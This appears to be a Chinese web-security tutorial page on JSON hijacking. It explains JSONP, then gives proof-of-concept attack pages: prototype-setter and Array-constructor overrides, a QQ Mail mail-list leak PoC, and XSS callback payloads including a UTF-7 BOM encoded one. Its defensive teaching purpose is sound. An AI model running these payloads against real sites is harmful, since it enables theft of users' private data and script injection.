@@ -1,0 +1,994 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+<meta name="google-site-verification" content="LzR3qfX_YDfkNEusKegSylZBjqRw3vczTwICGpJ1GRI" />
+<meta name="baidu-site-verification" content="IhNq56RJS1" />
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Ehcoo" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.2" />
+
+
+
+
+
+
+<meta name="description" content="JavaScript Hijacking和CSRF很相像，唯一不同的是，CSRF是模拟你的身份去发送请求，JavaScript Hijacking是模拟你的身份，窃取你在服务器上的私隐信息。 1.攻击原理:Json Hijacking攻击的思想见下图：">
+<meta name="keywords" content="BlockChain,Distributed Computing">
+<meta property="og:type" content="article">
+<meta property="og:title" content="​【WEB安全】WEB安全基础知识系列- JSON Hijacking">
+<meta property="og:url" content="http://www.ehcoo.com/json-hijacking.html">
+<meta property="og:site_name" content="Ehcoo">
+<meta property="og:description" content="JavaScript Hijacking和CSRF很相像，唯一不同的是，CSRF是模拟你的身份去发送请求，JavaScript Hijacking是模拟你的身份，窃取你在服务器上的私隐信息。 1.攻击原理:Json Hijacking攻击的思想见下图：">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://helloword.1kapp.com/wp-content/uploads/2016/06/061016_1601_WEBWEB15.jpg">
+<meta property="og:updated_time" content="2017-10-29T15:38:31.054Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="​【WEB安全】WEB安全基础知识系列- JSON Hijacking">
+<meta name="twitter:description" content="JavaScript Hijacking和CSRF很相像，唯一不同的是，CSRF是模拟你的身份去发送请求，JavaScript Hijacking是模拟你的身份，窃取你在服务器上的私隐信息。 1.攻击原理:Json Hijacking攻击的思想见下图：">
+<meta name="twitter:image" content="http://helloword.1kapp.com/wp-content/uploads/2016/06/061016_1601_WEBWEB15.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 'undefined',
+      author: 'Author'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://www.ehcoo.com/json-hijacking.html"/>
+
+
+  <title> ​【WEB安全】WEB安全基础知识系列- JSON Hijacking | Ehcoo </title>
+</head>
+
+<body itemscope itemtype="//schema.org/WebPage" lang="default">
+
+  
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?83e3b6b55c0e48f5d0848d6a14b76c02";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="//schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+  
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">Ehcoo</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about-me" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+
+    </div>
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                ​【WEB安全】WEB安全基础知识系列- JSON Hijacking
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Posted on</span>
+            <time itemprop="dateCreated" datetime="2016-06-11T00:01:36+00:00" content="2016-06-11">
+              2016-06-11
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/WEB安全/" itemprop="url" rel="index">
+                    <span itemprop="name">WEB安全</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/json-hijacking.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="json-hijacking.html" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+		  
+          
+          
+
+          
+		 
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="JavaScript-Hijacking和CSRF很相像，唯一不同的是，CSRF是模拟你的身份去发送请求，JavaScript-Hijacking是模拟你的身份，窃取你在服务器上的私隐信息。"><a href="#JavaScript-Hijacking和CSRF很相像，唯一不同的是，CSRF是模拟你的身份去发送请求，JavaScript-Hijacking是模拟你的身份，窃取你在服务器上的私隐信息。" class="headerlink" title="JavaScript Hijacking和CSRF很相像，唯一不同的是，CSRF是模拟你的身份去发送请求，JavaScript Hijacking是模拟你的身份，窃取你在服务器上的私隐信息。"></a><span style="font-family: 仿宋; font-size: 14pt;">JavaScript Hijacking和CSRF很相像，唯一不同的是，CSRF是模拟你的身份去发送请求，JavaScript Hijacking是模拟你的身份，窃取你在服务器上的私隐信息。</span></h2><p></p>
+<h2 id="1-攻击原理"><a href="#1-攻击原理" class="headerlink" title="1.攻击原理:"></a>1.攻击原理:</h2><h2 id="Json-Hijacking攻击的思想见下图："><a href="#Json-Hijacking攻击的思想见下图：" class="headerlink" title="Json Hijacking攻击的思想见下图："></a><span style="font-family: 仿宋; font-size: 14pt;">Json Hijacking攻击的思想见下图：</span></h2><p></p>
+<p><img src="http://helloword.1kapp.com/wp-content/uploads/2016/06/061016_1601_WEBWEB15.jpg" alt=""></p>
+<h2 id=""><a href="#" class="headerlink" title=""></a><span style="font-family: 仿宋; font-size: 14pt;"><a id="more"></a></span></h2><p></p>
+<h2 id="（1）-你正常访问信任站点（http-www-Bank-com），然后登陆信任站点。"><a href="#（1）-你正常访问信任站点（http-www-Bank-com），然后登陆信任站点。" class="headerlink" title="（1）.你正常访问信任站点（http://www.Bank.com），然后登陆信任站点。"></a><span style="font-family: 仿宋; font-size: 14pt;">（1）.你正常访问信任站点（<a href="http://www.bank.com/" target="_blank" rel="external">http://www.Bank.com</a>），然后登陆信任站点。</span></h2><p></p>
+<h2 id="（2）-信任站点通过你的验证，并返回Cookie。"><a href="#（2）-信任站点通过你的验证，并返回Cookie。" class="headerlink" title="（2）.信任站点通过你的验证，并返回Cookie。"></a><span style="font-family: 仿宋; font-size: 14pt;">（2）.信任站点通过你的验证，并返回Cookie。</span></h2><p></p>
+<h2 id="（3）-这时，在你还没有登出信任站点之前，你再打开了一个浏览器的tab页，并访问了一个恶意站点（www-BadGuy-com）。"><a href="#（3）-这时，在你还没有登出信任站点之前，你再打开了一个浏览器的tab页，并访问了一个恶意站点（www-BadGuy-com）。" class="headerlink" title="（3）.这时，在你还没有登出信任站点之前，你再打开了一个浏览器的tab页，并访问了一个恶意站点（www.BadGuy.com）。"></a><span style="font-family: 仿宋; font-size: 14pt;">（3）.这时，在你还没有登出信任站点之前，你再打开了一个浏览器的tab页，并访问了一个恶意站点（<a href="http://www.badguy.com/" target="_blank" rel="external">www.BadGuy.com</a>）。</span></h2><p></p>
+<h2 id="（4）-恶意站点向请求用户访问http-www-Bank-com的一个资源。"><a href="#（4）-恶意站点向请求用户访问http-www-Bank-com的一个资源。" class="headerlink" title="（4）.恶意站点向请求用户访问http://www.Bank.com的一个资源。"></a><span style="font-family: 仿宋; font-size: 14pt;">（4）.恶意站点向请求用户访问<a href="http://www.bank.com/" target="_blank" rel="external">http://www.Bank.com</a>的一个资源。</span></h2><p></p>
+<h2 id="（5）-浏览器带着之前的Cookie信息，向信任站点发送一个AJAX的GET请求或者JSONP跨域请求"><a href="#（5）-浏览器带着之前的Cookie信息，向信任站点发送一个AJAX的GET请求或者JSONP跨域请求" class="headerlink" title="（5）.浏览器带着之前的Cookie信息，向信任站点发送一个AJAX的GET请求或者JSONP跨域请求"></a><span style="font-family: 仿宋; font-size: 14pt;">（5）.浏览器带着之前的Cookie信息，向信任站点发送一个AJAX的GET请求或者JSONP跨域请求</span></h2><p></p>
+<h2 id="（6）-信任站点验证的Cookie信息通过，根据请求返回一个JSON数组或者回调数据如mycallback-‘id’-’123’-。"><a href="#（6）-信任站点验证的Cookie信息通过，根据请求返回一个JSON数组或者回调数据如mycallback-‘id’-’123’-。" class="headerlink" title="（6）.信任站点验证的Cookie信息通过，根据请求返回一个JSON数组或者回调数据如mycallback({‘id’:’123’})。"></a><span style="font-family: 仿宋; font-size: 14pt;">（6）.信任站点验证的Cookie信息通过，根据请求返回一个JSON数组或者回调数据如mycallback({‘id’:’123’})。</span></h2><p></p>
+<h2 id="（7）-你的浏览器收到来自http-www-Bank-com的响应后，转发响应中的JSON信息给恶意站点。至此，恶意站点拿到你关于http-www-Bank-com的信息。"><a href="#（7）-你的浏览器收到来自http-www-Bank-com的响应后，转发响应中的JSON信息给恶意站点。至此，恶意站点拿到你关于http-www-Bank-com的信息。" class="headerlink" title="（7）.你的浏览器收到来自http://www.Bank.com的响应后，转发响应中的JSON信息给恶意站点。至此，恶意站点拿到你关于http://www.Bank.com的信息。"></a><span style="font-family: 仿宋; font-size: 14pt;">（7）.你的浏览器收到来自<a href="http://www.bank.com/" target="_blank" rel="external">http://www.Bank.com</a>的响应后，转发响应中的JSON信息给恶意站点。至此，恶意站点拿到你关于<a href="http://www.bank.com/" target="_blank" rel="external">http://www.Bank.com</a>的信息。</span></h2><p></p>
+<h2 id="2-JSONP的介绍"><a href="#2-JSONP的介绍" class="headerlink" title="2.JSONP的介绍:"></a>2.JSONP的介绍:</h2><p><span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">为了更好的引述下面的话题，下面我借用stackoverflow上的话题来介绍一下JSONP<br></span></p>
+<p><span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">JSONP is really a simple trick to overcome the XMLHttpRequest same domain policy. (As you know one cannot send AJAX (XMLHttpRequest) request to a different domain.)，So - instead of using XMLHttpRequest we have to use script HTML tags, the ones you usually use to load js files, in order for js to get data from another domain. Sounds weird?，Thing is - turns out script tags can be used in a fashion similar to XMLHttpRequest! Check this out:<br></span></p>
+<div><br><table style="border-collapse: collapse; background: #fabf8f;" border="0"><colgroup> <col style="width: 590px;"></colgroup><br><tbody valign="top"><br><tr><br><td style="padding-left: 7px; padding-right: 7px; border: solid 0.5pt;">script = document.createElement(‘script’);<br><br>script.type = ‘text/javascript’;<br><br>script.src = ‘<a href="http://www.someWebApiServer.com/some-data" target="_blank" rel="external">http://www.someWebApiServer.com/some-data</a>‘;</td><br></tr><br></tbody><br></table><br></div>
+
+<p><span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">You will end up with a script segment that looks like this after it loads the data:<br></span></p>
+<div><br><table style="border-collapse: collapse; background: #fabf8f;" border="0"><colgroup> <col style="width: 590px;"></colgroup><br><tbody valign="top"><br><tr><br><td style="padding-left: 7px; padding-right: 7px; border: solid 0.5pt;">&lt;script&gt;<br><br>{[‘some string 1’, ‘some data’, ‘whatever data’]}<br><br>&lt;/script&gt;</td><br></tr><br></tbody><br></table><br></div>
+
+<p><span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">However this is a bit inconvenient, because we have to fetch this array from script tag. So JSONPcreators decided that this will work better(and it is):<br></span></p>
+<div><br><table style="border-collapse: collapse; background: #fabf8f;" border="0"><colgroup> <col style="width: 590px;"></colgroup><br><tbody valign="top"><br><tr><br><td style="padding-left: 7px; padding-right: 7px; border: solid 0.5pt;">script = document.createElement(‘script’);<br><br>script.type = ‘text/javascript’;<br><br>script.src = ‘<a href="http://www.someWebApiServer.com/some-data?callback=my_callback" target="_blank" rel="external">http://www.someWebApiServer.com/some-data?callback=my_callback</a>‘;</td><br></tr><br></tbody><br></table><br></div>
+
+<p><span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">Notice the my_callback function over there? So - when JSONP server receives your request and finds callback parameter - instead of returning plain js array it’ll return this:<br></span></p>
+<div><br><table style="border-collapse: collapse; background: #fabf8f;" border="0"><colgroup> <col style="width: 590px;"></colgroup><br><tbody valign="top"><br><tr><br><td style="padding-left: 7px; padding-right: 7px; border: solid 0.5pt;">my_callback({[‘some string 1’, ‘some data’, ‘whatever data’]});</td><br></tr><br></tbody><br></table><br></div>
+
+<p><span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">See where the profit is: now we get automatic callback (my_callback) that’ll be triggered once we get the data.That’s all there is to know about JSONP: it’s a callback and script tags.，NOTE: these are simple examples of JSONP usage, these are not production ready scripts.<br></span></p>
+<div><br><table style="border-collapse: collapse; background: #fabf8f;" border="0"><colgroup> <col style="width: 590px;"></colgroup><br><tbody valign="top"><br><tr><br><td style="padding-left: 7px; padding-right: 7px; border: solid 0.5pt;"><strong>Basic JavaScript example (simple Twitter feed using JSONP)
+</strong><br><br>&lt;html&gt;<br><br>&lt;head&gt;<br><br>&lt;/head&gt;<br><br>&lt;body&gt;<br><br>&lt;div id = ‘twitterFeed’&gt;&lt;/div&gt;<br><br>&lt;script&gt;<br><br>function myCallback(dataWeGotViaJsonp){<br><br>var text = ‘’;<br><br>var len = dataWeGotViaJsonp.length;<br><br>for(var i=0;i&lt;len;i++){<br><br>twitterEntry = dataWeGotViaJsonp[i];<br><br>text += ‘&lt;p&gt;&lt;img src = “‘ + twitterEntry.user.profile_image_url_https +’”/&gt;’ + twitterEntry[‘text’] + ‘&lt;/p&gt;’<br><br>}<br><br>document.getElementById(‘twitterFeed’).innerHTML = text;<br><br>}<br><br>&lt;/script&gt;<br><br>&lt;script type=”text/javascript” src=”<a href="http://twitter.com/status/user_timeline/padraicb.json?count=10&amp;callback=myCallback&quot;&gt;&lt;/script&amp;gt" target="_blank" rel="external">http://twitter.com/status/user_timeline/padraicb.json?count=10&amp;callback=myCallback&quot;&gt;&lt;/script&amp;gt</a>;<br><br>&lt;/body&gt;<br><br>&lt;/html&gt;<br><br><strong>Basic jQuery example (simple Twitter feed using JSONP)
+</strong><br><br>&lt;html&gt;<br><br>&lt;head&gt;<br><br>&lt;script type=”text/javascript” src=”<a href="https://ajax.googleapis.com/ajax/libs/jquery/1.6.2/jquery.min.js&quot;&gt;&lt;/script&amp;gt" target="_blank" rel="external">https://ajax.googleapis.com/ajax/libs/jquery/1.6.2/jquery.min.js&quot;&gt;&lt;/script&amp;gt</a>;<br><br>&lt;script&gt;<br><br>$(document).ready(function(){<br><br>$.ajax({<br><br>url: ‘<a href="http://twitter.com/status/user_timeline/padraicb.json?count=10" target="_blank" rel="external">http://twitter.com/status/user_timeline/padraicb.json?count=10</a>‘,<br><br>dataType: ‘jsonp’,<br><br>success: function(dataWeGotViaJsonp){<br><br>var text = ‘’;<br><br>var len = dataWeGotViaJsonp.length;<br><br>for(var i=0;i&lt;len;i++){<br><br>twitterEntry = dataWeGotViaJsonp[i];<br><br>text += ‘&lt;p&gt;&lt;img src = “‘ + twitterEntry.user.profile_image_url_https +’”/&gt;’ + twitterEntry[‘text’] + ‘&lt;/p&gt;’<br><br>}<br><br>$(‘#twitterFeed’).html(text);<br><br>}<br><br>});<br><br>})<br><br>&lt;/script&gt;<br><br>&lt;/head&gt;<br><br>&lt;body&gt;<br><br>&lt;div id = ‘twitterFeed’&gt;&lt;/div&gt;<br><br>&lt;/body&gt;<br><br>&lt;/html&gt;</td><br></tr><br></tbody><br></table><br></div>
+
+<p><span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">JSONP stands for JSON with Padding. (very poorly named technique as it really has nothing to do with what most people would think of as “padding”.)<br></span></p>
+<p><span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">总结：AJAX的底层原理是XMLHttpRequest，但是由于浏览器的同源策略，无论是get还是post请求，均不允许进行跨域操作，但是html对js和css则没有限制，这要是网站优化动静态元素分离的一个基础，JSONP就是基于此事实，去后台请求时返回可以执行的JS,例如&lt;script type=”text/javascript” src=”<a href="https://ajax.min.js&quot;&gt;&lt;/script&amp;gt" target="_blank" rel="external">https://ajax.min.js&quot;&gt;&lt;/script&amp;gt</a>; 返回mycallback({‘id’:’123’}，如果此刻在页面中有函数，Function mycallback(obj){alert(obj.id)} 则能正常的返回<br></span></p>
+<h2 id="2-攻击举例"><a href="#2-攻击举例" class="headerlink" title="2.攻击举例"></a>2.攻击举例</h2><p><span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">实际应用中返回的数据格式有两种，一种是数据，一种是对象<br></span></p>
+<p><span style="color: #17365d; font-family: 仿宋; font-size: 14pt;"><strong>对象的攻击方式
+</strong></span></p>
+<div><br><table style="border-collapse: collapse; background: #fabf8f;" border="0"><colgroup> <col style="width: 590px;"></colgroup><br><tbody valign="top"><br><tr><br><td style="padding-left: 7px; padding-right: 7px; border: solid 0.5pt;">&lt;html&gt;<br><br>…<br><br>&lt;body&gt;<br><br>&lt;script type=”text/javascript”&gt;<br><br>Object.prototype.<strong>defineSetter</strong>(‘Id’, function(obj){alert(obj);});<br><br>&lt;/script&gt;<br><br>&lt;script src=”<a href="http://example.com/Home/AdminBalances&quot;&gt;&lt;/script&amp;gt" target="_blank" rel="external">http://example.com/Home/AdminBalances&quot;&gt;&lt;/script&amp;gt</a>;<br><br>&lt;/body&gt;<br><br>&lt;/html&gt;</td><br></tr><br></tbody><br></table><br></div><br><span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">其中用到了Javascript的原型，如果对Javascript的原型不够熟悉，可以参考之前的文章<a href="http://helloword.1kapp.com/archives/1056" target="_blank" rel="external">《【编程语言】深刻理解javascript原型（<em>proto</em>）》</a><br></span><br><br><span style="color: #17365d; font-family: 仿宋; font-size: 14pt;"><strong>数组的攻击方式
+</strong></span><br><div><br><table style="border-collapse: collapse; background: #fabf8f;" border="0"><colgroup> <col style="width: 590px;"></colgroup><br><tbody valign="top"><br><tr><br><td style="padding-left: 7px; padding-right: 7px; border: solid 0.5pt;">&lt;script type=”text/javascript”&gt;<br><br>var secrets;<br><br>&nbsp;<br><br>Array = function() {<br><br>secrets = this;<br><br>};<br><br>&lt;/script&gt;<br><br>&lt;script src=”<a href="http://haacked.com/demos/secret-info.json" target="_blank" rel="external">http://haacked.com/demos/secret-info.json</a>“<br><br>type=”text/javascript”&gt;&lt;/script&gt;<br><br>&nbsp;<br><br>&lt;script type=”text/javascript”&gt;<br><br>var yourData = ‘’;<br><br>var i = -1;<br><br>while(secrets[++i]) {<br><br>yourData += secrets[i] + ‘ ‘;<br><br>}<br><br>alert(‘I stole your data: ‘ + yourData);<br><br>&lt;/script&gt;</td><br></tr><br></tbody><br></table><br></div><br><span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">下面举一个实际的例子，通过构造URL让用户访问，可以获得QQ Mail的邮件列表。该漏洞由于需要在web QQ里共享QQ Mail里的邮件信息，所以QQ Mail开放了一个json接口以提供第三方的域名来获得QQ Mail的信息，但是由于该接口缺乏足够的认证，所以导致任何第三方域里都可以用script的方式来获取该邮件列表。<a href="http://www.wooyun.org/bugs/wooyun-2010-046" target="_blank" rel="external">WooYun: QQMail邮件泄露漏洞</a> 详见地址<a href="http://www.wooyun.org/bugs/wooyun-2010-046" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-046</a><br></span><br><div><br><table style="border-collapse: collapse; background: #fabf8f;" border="0"><colgroup> <col style="width: 590px;"></colgroup><br><tbody valign="top"><br><tr><br><td style="padding-left: 7px; padding-right: 7px; border: solid 0.5pt;">&lt;script&gt;<br><br>var Qmail={};<br><br>&lt;/script&gt;<br><br>&lt;script src=”<a href="http://mail.qq.com/cgi-bin/login?fun=passport&amp;target=MLIST&amp;t=login.js&amp;pagesize=10&amp;resp_charset=gb2312&amp;1=3&quot;&gt;&lt;/script&amp;gt" target="_blank" rel="external">http://mail.qq.com/cgi-bin/login?fun=passport&amp;target=MLIST&amp;t=login.js&amp;pagesize=10&amp;resp_charset=gb2312&amp;1=3&quot;&gt;&lt;/script&amp;gt</a>;<br><br>&lt;script&gt;<br><br>alert(Qmail.newMailsList.nextUrl);<br><br>alert(document.scripts[1].src=Qmail.newMailsList.nextUrl);<br><br>alert(Qmail.newMailsList.summary);<br><br>&lt;/script&gt;</td><br></tr><br></tbody><br></table><br></div>
+
+<h2 id="4-漏洞防御"><a href="#4-漏洞防御" class="headerlink" title="4.漏洞防御:"></a>4.漏洞防御:</h2><p><span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">因为此类漏洞为CSRF的变种，因此CSRF的防御均可以使用，详见<a href="http://helloword.1kapp.com/archives/992" target="_blank" rel="external">《【WEB安全】WEB安全基础知识系列-跨站请求伪造(CSRF)》</a>，其中重点介绍JSONP中的callback防御，在早期 JSON 出现时候，大家都没有合格的编码习惯。再输出 JSON 时，没有严格定义好 Content-Type（ Content-Type: application/json ）然后加上 callback 这个输出点没有进行过滤直接导致了一个典型的 XSS 漏洞， 举例：<a href="http://127.0.0.1/getUsers.php?callback=&lt;script&gt;alert(/xss/" target="_blank" rel="external">http://127.0.0.1/getUsers.php?callback=&lt;script&gt;alert(/xss/)&lt;/script</a>&lt;/script)&gt;，对于 Content-Type 来说早期还有一部分人比较喜欢使用 application / javascript而这个头在 IE 等浏览器下一样可以解析 HTML 导致 XSS 漏洞。对于这种类型的漏洞，防御主要是从两个点去部署的：<br></span></p>
+<p><span style="color: #17365d; font-family: 仿宋; font-size: 14pt;"><strong>a、严格定义 Content-Type: application / json
+</strong></span></p>
+<p><span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">这样的防御机制导致了浏览器不解析恶意插入的 XSS 代码（直接访问提示文件下载）。但是凡事都有个案，在 IE 的进化过程中就出现过通过一些技巧绕过 Content-Type 防御解析 html ，比如在 IE6、7 等版本时请求的 URL 文件后面加一个 /x.html 就可以解析 html （ <a href="http://127.0.0.1/getUsers.php/x.html?callback=&lt;script&gt;alert(/xss/)&lt;/script&amp;gt" target="_blank" rel="external">http://127.0.0.1/getUsers.php/x.html?callback=&lt;script&gt;alert(/xss/)&lt;/script&amp;gt</a>;  ） 具体参考：<a href="http://hi.baidu.com/hi_heige/item/f1ecde01c4af3ed61ef04646" target="_blank" rel="external">http://hi.baidu.com/hi_heige/item/f1ecde01c4af3ed61ef04646</a><br></span></p>
+<p><span style="color: #17365d; font-family: 仿宋; font-size: 14pt;"><strong>b、过滤 callback 以及 JSON 数据输出
+</strong></span></p>
+<p><span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">这样的防御机制是比较传统的攻防思维，对输出点进行 xss 过滤。又是一个看上去很完美的解决方案，但是往往都是”事与愿违”。当年( 2011 年)一个 utf7-BOM 就复活了 n 个 XSS 漏洞。这种攻击方式主要还是存在与 IE 里(注在 IE 较新版本里已经”修复”) 也就是当我们在 callback 点输出 +/v8 这样的 utf7-BOM 的时候， IE 浏览器会把当前执行的编码认为是 utf7 ,所以我们通过 utf7 提交的 XSS 代码会被自动解码并执行。如：<br></span></p>
+<div><br><table style="border-collapse: collapse; background: #fabf8f;" border="0"><colgroup> <col style="width: 590px;"></colgroup><br><tbody valign="top"><br><tr><br><td style="padding-left: 7px; padding-right: 7px; border: solid 0.5pt;"><a href="http://127.0.0.1/getUsers.php?callback=%2B%2Fv8%20%2BADwAaAB0AG0APgA8AGIAbwBkAHkAPgA8AHMAYwByAGkAcAB0AD4AYQBsAGUAcgB0ACgAMQApADsAPAAvAHMAYwByAGkAcAB0AD4APAAvAGIAbwBkAHkAPgA8AC8AaAB0AG0APg-%20其中：%2B%2Fv8%20%2BADwAaAB0AG0APgA8AGIAbwBkAHkAPgA8AHMAYwByAGkAcAB0AD4AYQBsAGUAcgB0ACgAMQApADsAPAAvAHMAYwByAGkAcAB0AD4APAAvAGIAbwBkAHkAPgA8AC8AaAB0AG0APg-%20URLdecode" target="_blank" rel="external">http://127.0.0.1/getUsers.php?callback=%2B%2Fv8%20%2BADwAaAB0AG0APgA8AGIAbwBkAHkAPgA8AHMAYwByAGkAcAB0AD4AYQBsAGUAcgB0ACgAMQApADsAPAAvAHMAYwByAGkAcAB0AD4APAAvAGIAbwBkAHkAPgA8AC8AaAB0AG0APg-%20其中：%2B%2Fv8%20%2BADwAaAB0AG0APgA8AGIAbwBkAHkAPgA8AHMAYwByAGkAcAB0AD4AYQBsAGUAcgB0ACgAMQApADsAPAAvAHMAYwByAGkAcAB0AD4APAAvAGIAbwBkAHkAPgA8AC8AaAB0AG0APg-%20URLdecode</a> 为：+/v8+ADwAaAB0AG0APgA8AGIAbwBkAHkAPgA8AHMAYwByAGkAcAB0AD4AYQBsAGUAcgB0ACgAMQApADsAPAAvAHMAYwByAGkAcAB0AD4APAAvAGIAbwBkAHkAPgA8AC8AaAB0AG0APg-</td><br></tr><br></tbody><br></table><br></div>
+
+<p><span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">其中 +/v8  为 utf7-BOM ，后面的为我们注入的 utf-7 编码后的 XSS 代码的：<br>&lt;htm&gt;&lt;body&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;/body&gt;&lt;/htm&gt;<br></span></p>
+<h2 id="4-总结与思考"><a href="#4-总结与思考" class="headerlink" title="4.总结与思考:"></a>4.总结与思考:<span style="font-family: 宋体;"></span></h2><p></p>
+<ul>
+<li><span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">Json Hijacking 主要是利用了服务器对请求的信任和JS的强大的灵活性，<br></span></li>
+<li><span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">在使用JSONP时注意返回格式的严格定义，减少攻击的切入面<br></span></li>
+</ul>
+<h2 id="5-引用"><a href="#5-引用" class="headerlink" title="5.引用:"></a>5.引用:</h2><ul>
+<li><span style="color: black;"><span style="font-family: 仿宋; font-size: 12pt;"><a href="http://haacked.com/archive/2009/06/25/json-hijacking.aspx/" target="_blank" rel="external">http://haacked.com/archive/2009/06/25/json-hijacking.aspx/</a> </span><span style="font-family: 微软雅黑; font-size: 13pt;"><br></span></span></li>
+<li><span style="color: black;"><span style="font-family: 仿宋; font-size: 12pt;"><a href="http://haacked.com/archive/2008/11/20/anatomy-of-a-subtle-json-vulnerability.aspx/" target="_blank" rel="external">http://haacked.com/archive/2008/11/20/anatomy-of-a-subtle-json-vulnerability.aspx/</a></span><span style="font-family: 微软雅黑; font-size: 10pt;"><br></span></span></li>
